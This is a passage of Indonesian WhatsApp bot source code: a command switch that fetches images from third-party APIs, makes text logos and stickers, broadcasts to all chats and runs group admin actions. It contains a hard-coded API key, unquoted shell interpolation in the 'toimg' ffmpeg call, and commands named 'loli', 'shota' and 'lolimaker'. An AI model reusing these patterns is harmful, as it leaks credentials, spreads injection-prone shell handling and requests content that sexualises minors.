anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/ppcouple?apikey=${dhakey}`)
buff1 = await getBuffer (anu.result.male)
Dhani.sendMessage(from, buff1, image, {quoted: mek, caption: '_Nih kak cowoknya_'})
buff2 =await getBuffer (anu.result.female)
Dhani.sendMessage(from, buff2, image, {quoted: mek, caption: '_Nih kak ceweknya_'})
break
case 'meme': 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/meme?apikey=${dhakey}`)
meme = await getBuffer(anu.result.url)
Dhani.sendMessage(from, meme, image, {quoted: mek, caption: '*Nih Kak*'})
break
case 'wallpaperhacker':
case 'wallpaperharley':
case 'wallpaperjoker':
oke = await getBuffer(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'quotesimage':
case 'renungan':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
oke = await getBuffer(anu.result)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'darkjoker':
case 'darkjokes':
case 'darkjokers':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/darkjokes?apikey=${dhakey}`)
oke = await getBuffer(anu.result.result)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'wallpapermuslim':
case 'wallpapercyberspace':
case 'wallpapermountain':
case 'wallpaperprogramming':
case 'wallpapertechnology':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/other/${command}?apikey=${dhakey}`)
oke = await getBuffer(anu.result)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break

//----> FITUR ANIME <----//

case 'wallpapernaruto':
oke = await getBuffer(`https://apidhani.herokuapp.com/api/anime/naruto?apikey=${dhakey}`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'waifu':
case 'neko':
oke = await getBuffer(`https://apidhani.herokuapp.com/api/anime/${command}`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'megumin':
reply(mess.wait)
oke = await getBuffer(`https://killuaapi89.herokuapp.com/api/megumin?apikey=nWsfxZ5p`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'poke':
reply(mess.wait)
oke = await getBuffer(`https://killuaapi89.herokuapp.com/api/poke?apikey=nWsfxZ5p`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'husbu':
reply(mess.wait)
oke = await getBuffer(`https://killuaapi89.herokuapp.com/api/husbu?apikey=nWsfxZ5p`)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'loli':
case 'milf':
case 'cosplay':
case 'nekonime':
case 'shota':
case 'wallml':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/anime/${command}?apikey=${dhakey}`)
loli = await getBuffer(anu.result)
Dhani.sendMessage(from, loli, image, {quoted: mek, caption: '*Nih Kak*'})
break

//══════════[ FITUR MAKER ]══════════//

case 'blackpink':
case 'halloween':
case '3dgradient':
case 'naturalleaves':
case 'dropwater':
case 'blood':
case 'blood2':
case 'neondevil':
case 'neon':
case 'neonlight':
case 'neonlight2':
case 'neonlight3':
case 'greenneon':
case 'toxic':
case 'matrix':
case 'thunder':
case 'thunder2':
case 'bokeh':
case 'carbontext':
case 'christmas':
case 'breakwall':
case 'roadwarning':
case 'engraved3d':
case 'embossed':
case 'writefoggy':
case '3dstone':
case 'futuristic':
case 'asketch':
case 'bluecircuit':
case 'space':
case 'amagmahot':
case 'artpapercut':
case '3dluxurygold':
case 'robotr2d2':
case 'harrypotter':
case 'glitch3':
case 'greenhorrorstyle':
case '3ddeepseametal':
case 'leddisplayscreen':
case 'wonderfulgraffitiart':
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/${command}?apikey=${dhakey}&text=${teks}`)
oke = await getBuffer(anu.result)
Dhani.sendMessage(from, oke, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
break
case 'hartatahta': 
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
reply(mess.wait)
harta = await getBuffer(`https://apidhani.herokuapp.com/api/maker/harta-tahta?apikey=${dhakey}&text=${teks}`)
Dhani.sendMessage(from, harta, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
break

//----> 2 TEXT <----//

case '8bit':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/8bit?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'pornhub':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/pornhub?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'glitch':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'glitch2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'layered':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/layered?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case '3dsteel':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/3dsteel?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'realistic':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/realistic?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'lionlogo':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/lionlogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'ninjalogo':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/ninjalogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wolf':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/logowolf?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wolf2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(6)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/logowolf2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'halloween2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(11)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/halloween2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'cinematichorror':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(16)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/cinematichorror?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'avengers':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/avengerslogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'graffiti3':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/coolwallgraffiti?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'captainamerica':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(15)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/captainamerica?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Dhani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'girlneko':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/girlneko?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'sadboy':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/sadboy?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'kaneki':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/kaneki?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'rem':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(4)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/rem?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'lolimaker':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/lolimaker?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'gura':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/gura?apikey=${dhakey}&text=${F1}&text2=${F2}`)
Dhani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break

//══════════[ FITUR STICKER ]══════════//

case 'gifstiker':
case 's':
case 'stickergif':  
case 'sticker':
case 'stiker':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Dhani.downloadAndSaveMediaMessage(encmedia)
ran = '666.webp'
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('error')
})
.on('end', function () {
console.log('Finish')
Dhani.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Dhani.downloadAndSaveMediaMessage(encmedia)
ran = '999.webp'
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
})
.on('end', function () {
console.log('Finish')
Dhani.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
}
break
case 'attp':
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					Dhani.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case 'toimg':
if (!isQuotedSticker) return reply('reply stickernya')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Dhani.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
buffer = fs.readFileSync(ran)
Dhani.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
fs.unlinkSync(ran)
})
break

//══════════[ FITUR OWNER ]══════════//

case 'owner':
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
Dhani.sendMessage(from, {displayName: `Ownernya ${botname}`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply(`_Tuh Kak Ownerku_`)
break
case 'public':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			publik = true
				reply('Sukses mengubah mode self ke public')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				publik = false
				reply('Sukses mengubah mode public ke self')
			break
case 'bc':
             if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu100 = await Dhani.chats.all()
             if (isMedia && !Dhani.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Dhani).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Dhani
             bc100 = await Dhani.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             Dhani.sendMessage(_.jid, bc100, image, {quoted: ftrol, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             Dhani.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": `${tanggal}`,
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "ᴍᴇɴᴜ"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
case 'bc2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
anu = await Dhani.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await Dhani.downloadMediaMessage(encmedia)
for (let _ of anu) {
Dhani.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
}
reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await Dhani.downloadMediaMessage(encmedia)
for (let _ of anu) {
Dhani.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
}
reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await Dhani.downloadMediaMessage(encmedia)
for (let _ of anu) {
Dhani.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
}
reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
} else {
for (let _ of anu) {
sendMess(_.jid, `Bot Broadcast\n\n${body.slice(4)}`)
}
reply(`Sukses Broadcast`)
}
break
//══════════[ FITUR GROUP ]══════════//

case 'welcome':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome on untuk mengaktifkan\n${prefix}welcome off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isWelkom) return reply('*welcome sudah aktif !!*')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isWelkom) return reply('*welcome sudah off sebelumnya !!*')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('*on untuk mengaktifkan, off untuk menonaktifkan*')
}
break
case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiLink) return reply(`Udah aktif`)
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antilink.indexOf(from)
_antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
break
case 'antivirtex':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiVirtex) return reply(`Udah aktif`)
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antivirtex.indexOf(from)
_antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
break
case 'group':
case 'grup':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args[0] === 'buka') {
reply(`*Berhasil Membuka Grup ${groupMetadata.subject}*`)
Dhani.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
reply(`*Berhasil Memtutup Grup ${groupMetadata.subject}*`)
Dhani.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
case 'linkgroup':
case 'linkgrup':
case 'linkgc':
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await Dhani.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Dhani.sendMessage(from, yeh, text, { quoted: ftrol })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Dhani.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
Dhani.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Dhani.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Dhani.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Dhani.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case "kick":
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (
mek.message.extendedTextMessage === undefined ||
mek.message.extendedTextMessage === null
)
return reply("Tag target yang ingin di kick!");
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) {
Dhani.groupRemove(from, mentioned);
reply(mess.success);
} else if (mentioned.length < 1) {
anu = mek.message.extendedTextMessage.contextInfo.participant;
Dhani.groupRemove(from, [anu]);
reply(mess.success);
} else {
Dhani.groupRemove(from, mentioned);
reply(mess.success);
}
break;
case 'tagall':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
